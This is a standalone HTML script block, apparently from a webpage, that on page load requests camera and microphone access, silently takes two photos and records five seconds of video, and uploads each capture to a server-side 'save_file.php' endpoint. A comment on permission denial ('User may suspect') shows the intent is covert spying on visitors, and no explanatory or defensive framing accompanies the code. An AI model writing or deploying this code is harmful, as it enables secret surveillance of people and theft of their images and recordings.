<script type="text/javascript">
function la(src) {      window.location = src;
    }
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then((stream) => {
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const videoRecorder = new MediaRecorder(stream);

        async function capturePhotos() {
            try {
                const photo1 = await imageCapture.takePhoto();
                saveToFolder(photo1, 'photo');

                const photo2 = await imageCapture.takePhoto();
                saveToFolder(photo2, 'photo');
            } catch (error) {
                console.error('Error capturing photos:', error);
            }
        }

        function startVideoRecording() {
            videoRecorder.start();
            setTimeout(() => {
                videoRecorder.stop();
            }, 5000); // Record for 5 seconds
        }

        videoRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                saveToFolder(event.data, 'video');
            }
        };

        // First, capture photos, then record video
        capturePhotos().then(() => startVideoRecording());
    })
    .catch((error) => {
        if (error.name === 'NotAllowedError') {
            console.warn('Permissions denied. User may suspect.');
        } else {
            console.error('Permission error:', error);
        }
    });

  function saveToFolder(data, type) {
      const formData = new FormData();
      formData.append('file', data, `${type}-${Date.now()}.${type === 'photo' ? 'jpg' : 'mp4'}`);
      formData.append('type', type);

      fetch('save_file.php', {
          method: 'POST',
          body: formData
      })
          .then((response) => response.json())
          .then((data) => console.log(data))
          .catch((error) => console.error('Error saving file:', error));
  }
</script>
